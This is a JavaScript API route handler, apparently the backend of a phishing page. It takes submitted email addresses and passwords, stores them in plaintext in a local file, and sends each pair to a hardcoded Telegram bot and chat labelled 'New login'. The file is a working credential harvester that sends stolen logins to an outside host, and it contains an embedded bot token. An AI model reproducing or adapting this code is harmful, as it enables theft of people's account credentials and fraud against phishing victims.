const fs = require('fs');
const path = require('path');

export default async function handler(req, res) {
    // Ensure the request method is POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // Extract email and password from the request body
        const { email, password } = req.body;

        // Save credentials to a file
        const filePath = path.join(process.cwd(), 'username.txt');
        const data = `Email: ${email}, Password: ${password}\n`;
        fs.appendFileSync(filePath, data);

        // Send credentials to Telegram bot
        const telegramBotToken = '8159292912:AAGhCvnSWDPw545joH4Jz_N1sM94J425Zwo'; // New bot token
        const chatId = '7587120060'; // Same chat ID
        const message = encodeURIComponent(`New login:\nEmail: ${email}\nPassword: ${password}`);
        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;

        // Send the message to Telegram
        const response = await fetch(telegramUrl);
        const result = await response.json();

        // Check if the Telegram API request was successful
        if (!response.ok) {
            throw new Error(`Telegram API error: ${result.description}`);
        }

        // Respond with success
        return res.status(200).json({ success: true });
    } catch (error) {
        // Log the error and respond with an error message
        console.error('Error in submit.js:', error.message);
        return res.status(500).json({ error: 'Failed to process request' });
    }
}
